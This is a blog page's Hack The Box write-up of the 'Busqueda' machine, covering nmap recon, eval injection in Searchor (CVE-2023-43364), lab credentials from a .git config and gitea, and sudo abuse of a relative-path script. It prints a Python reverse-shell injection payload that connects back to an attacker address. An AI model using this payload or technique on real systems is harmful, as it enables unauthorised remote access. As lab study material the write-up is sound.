@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Busqueda | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Easy Linux">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/htb/busqueda-easy-linux/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/htb/busqueda-easy-linux/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/htb/busqueda-easy-linux/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Busqueda">
+  <meta property="og:description" content="Easy Linux">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Busqueda">
+  <meta name="twitter:description" content="Easy Linux">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hack The Box",
+      "item": "http://localhost:1313/htb/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Busqueda",
+      "item": "http://localhost:1313/htb/busqueda-easy-linux/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Busqueda",
+  "name": "Busqueda",
+  "description": "Easy Linux",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap scan Port 22 - ssh - OpenSSH 8.9p1 Ubuntu Port 80 - Apacher 2.4.52\nGoing to http://10.129.228.217/ we get a redirect to http://searcher.htb\nAdd to hosts file\nGoing to http://searcher.htb - we see a “search” thing where you can select a search engine and a query which outputs a url to the corresponding search engine\nbottom of page: I see flask and the /search page has the query within the url so my spidey senses tell me potentially Server-Side Template Injection\nhttps://nvd.nist.gov/vuln/detail/cve-2023-43364 main.py in Searchor before 2.4.2 uses eval on CLI input, which may cause unexpected code execution.\nCVE-2023-43364 is related to the following code in main.py of searchor url = eval( f\"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})\" ) # So essentially we can change the query value above # After playing around a bit, this is what allows python commands to run # Note - eval() does not allow ; character - so you have to use exec() def func(a,b,c): print(f\"{a},{b},{c}\") query=\"',exec(print(10)))#\" engine=\"e\" copy=\"c\" eval(f\"func('{engine}','{query}','{copy}')\") # so the following should work as a payload # https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet ',exec(\"PYTHON_CODE\"))# ',exec(\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.196',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"))# We see a config file in the .git directory which contains some creds cody:jh1usoih2bkjaspwe92\nbut…..looking at the /etc/passwd file, there is no cody user - there seems to just be a _laurel user\nnvm svc has a home directory with user.txt those creds in the .git file actually are the password for the current user svc\nWe can run python3 /opt/scripts/system-checkup.py with at least 1 argument as root sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq run this to see data - from https://docs.docker.com/engine/cli/formatting/\ngitea yuiu1hoiu4i5ho1uh\nGo to http://gitea.searcher.htb and sign in page signing in as cody worked - we can see another user administrator\nUse password we got for gitea\nchange code for system-checkup.py\nwe could not change code because server is blocking it - seems like we cant commit to the files or create new files\nLooking at the system-checkup.py code - we see the relative path being used:\nmake our own .sh in home directory with reverse shell back to attack machine ",
+  "wordCount" : "346",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/htb/busqueda-easy-linux/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Busqueda
+    </h1>
+    <div class="post-description">
+      Easy Linux
+    </div>
+  </header> 
+  <div class="post-content md-content"><p>nmap scan
+<img alt="Busqueda (Easy Linux).png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29.png">
+Port 22 - ssh - OpenSSH 8.9p1 Ubuntu
+Port 80 - Apacher 2.4.52</p>
+<p>Going to http://10.129.228.217/ we get a redirect to <a href="http://searcher.htb">http://searcher.htb</a></p>
+<p>Add to hosts file</p>
+<p>Going to <a href="http://searcher.htb">http://searcher.htb</a> - we see a &ldquo;search&rdquo; thing where you can select a search engine and a query which outputs a url to the corresponding search engine</p>
+<p>bottom of page:
+<img alt="Busqueda (Easy Linux)-1.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-1.png"></p>
+<p>I see flask and the /search page has the query within the url so my spidey senses tell me potentially Server-Side Template Injection</p>
+<p><a href="https://nvd.nist.gov/vuln/detail/cve-2023-43364">https://nvd.nist.gov/vuln/detail/cve-2023-43364</a>
+main.py in Searchor before 2.4.2 uses eval on CLI input, which may cause unexpected code execution.</p>
+<p>CVE-2023-43364 is related to the following code in main.py of searchor
+<img alt="Busqueda (Easy Linux)-2.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-2.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="sa">f</span><span class="s2">&#34;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s2">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># So essentially we can change the query value above</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># After playing around a bit, this is what allows python commands to run</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Note - eval() does not allow ; character - so you have to use exec()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">func</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">=</span><span class="s2">&#34;&#39;,exec(print(10)))#&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">engine</span><span class="o">=</span><span class="s2">&#34;e&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">copy</span><span class="o">=</span><span class="s2">&#34;c&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;func(&#39;</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s2">&#39;)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># so the following should work as a payload</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;,exec(&#34;PYTHON_CODE&#34;))#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;,exec(&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;</span><span class="mf">10.10.16.196</span><span class="s1">&#39;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#39;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="s1">&#39;,&#39;</span><span class="o">-</span><span class="n">i</span><span class="s1">&#39;]);&#34;))#</span>
+</span></span></code></pre></div><p><img alt="Busqueda (Easy Linux)-4.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-4.png"></p>
+<p><img alt="Busqueda (Easy Linux)-3.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-3.png"></p>
+<p><img alt="Busqueda (Easy Linux)-5.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-5.png"></p>
+<p>We see a config file in the .git directory which contains some creds
+<img alt="Busqueda (Easy Linux)-6.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-6.png"></p>
+<p><code>cody:jh1usoih2bkjaspwe92</code></p>
+<p>but&hellip;..looking at the /etc/passwd file, there is no cody user - there seems to just be a <code>_laurel</code> user</p>
+<p>nvm svc has a home directory with user.txt
+<img alt="Busqueda (Easy Linux)-7.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-7.png"></p>
+<p>those creds in the .git file actually are the password for the current user <code>svc</code></p>
+<p><img alt="Busqueda (Easy Linux)-8.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-8.png"></p>
+<p>We can run <code>python3 /opt/scripts/system-checkup.py</code> with at least 1 argument as <code>root</code>
+<img alt="Busqueda (Easy Linux)-9.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-9.png"></p>
+<p><img alt="Busqueda (Easy Linux)-10.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-10.png">
+<code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq</code>
+run this to see data - from <a href="https://docs.docker.com/engine/cli/formatting/">https://docs.docker.com/engine/cli/formatting/</a></p>
+<p><img alt="Busqueda (Easy Linux)-11.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-11.png"></p>
+<p><code>gitea</code>
+<code>yuiu1hoiu4i5ho1uh</code></p>
+<p>Go to <a href="http://gitea.searcher.htb">http://gitea.searcher.htb</a> and sign in page
+<img alt="Busqueda (Easy Linux)-12.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-12.png"></p>
+<p><img alt="Busqueda (Easy Linux)-13.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-13.png">
+signing in as cody worked - we can see another user <code>administrator</code></p>
+<p>Use password we got for gitea</p>
+<p><img alt="Busqueda (Easy Linux)-14.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-14.png"></p>
+<p>change code for system-checkup.py</p>
+<p>we could not change code because server is blocking it - seems like we cant commit to the files or create new files</p>
+<p>Looking at the system-checkup.py code - we see the relative path being used:</p>
+<p><img alt="Busqueda (Easy Linux)-15.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-15.png"></p>
+<p><img alt="Busqueda (Easy Linux)-16.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-16.png"></p>
+<p>make our own .sh in  home directory with reverse shell back to attack machine
+<img alt="Busqueda (Easy Linux)-17.png" loading="lazy" src="/htb/busqueda-easy-linux/Busqueda%20%28Easy%20Linux%29-17.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
